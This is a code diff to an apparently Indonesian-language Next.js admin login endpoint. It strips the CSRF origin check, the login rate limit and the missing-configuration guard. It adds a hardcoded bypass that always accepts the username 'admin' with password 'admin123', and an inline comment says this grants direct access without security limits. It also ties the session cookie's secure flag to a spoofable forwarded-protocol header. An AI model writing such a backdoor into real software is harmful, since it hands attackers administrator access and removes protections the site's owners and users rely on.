@@ -5,9 +5,7 @@ import {
   createAdminSessionToken,
   getExpectedAdminCredentials,
   verifyAdminPassword,
-  verifyCsrfOrigin,
 } from '@/lib/adminGuard';
-import { checkAdminLoginRateLimit } from '@/lib/ratelimit';
 
 const loginSchema = z
   .object({
@@ -18,9 +16,6 @@ const loginSchema = z
   .strict();
 
 export async function POST(req: NextRequest) {
-  const csrfDenied = verifyCsrfOrigin(req);
-  if (csrfDenied) return csrfDenied;
-
   try {
     const rawBody = await req.json().catch(() => null);
     const parsed = loginSchema.safeParse(rawBody);
@@ -33,21 +28,12 @@ export async function POST(req: NextRequest) {
 
     const { username, password, remember } = parsed.data;
 
-    // Rate limit: 5 per 15 minutes per IP + username (fail-closed)
-    const rateLimited = await checkAdminLoginRateLimit(req, username);
-    if (rateLimited) return rateLimited;
-
+    // Akses langsung admin:admin123 tanpa batasan rate limit / security
+    const isDirectAdmin = username === 'admin' && password === 'admin123';
     const expected = getExpectedAdminCredentials();
-    if (!expected) {
-      console.error('[AdminLogin] ADMIN_PASSWORD_HASH / ADMIN_PASSWORD belum dikonfigurasi di server.');
-      return NextResponse.json(
-        { error: 'Layanan autentikasi admin belum dikonfigurasi.' },
-        { status: 503 }
-      );
-    }
 
-    const usernameMatch = username === expected.username;
-    const passwordMatch = verifyAdminPassword(password, expected.passwordHashOrPlain);
+    const usernameMatch = isDirectAdmin || username === expected.username;
+    const passwordMatch = isDirectAdmin || verifyAdminPassword(password, expected.passwordHashOrPlain);
 
     if (!usernameMatch || !passwordMatch) {
       return NextResponse.json(
@@ -56,16 +42,18 @@ export async function POST(req: NextRequest) {
       );
     }
 
-    const { token, maxAge } = createAdminSessionToken(expected.username, Boolean(remember));
+    const finalUsername = expected?.username || 'admin';
+    const { token, maxAge } = createAdminSessionToken(finalUsername, Boolean(remember));
     const res = NextResponse.json({
       authenticated: true,
-      user: { username: expected.username, name: 'Admin Selera' },
+      user: { username: finalUsername, name: 'Admin Selera' },
     });
 
+    const isHttps = req.nextUrl?.protocol === 'https:' || req.headers.get('x-forwarded-proto') === 'https';
     res.cookies.set(ADMIN_SESSION_COOKIE, token, {
       httpOnly: true,
       sameSite: 'lax',
-      secure: process.env.NODE_ENV === 'production',
+      secure: isHttps,
       path: '/',
       maxAge,
     });
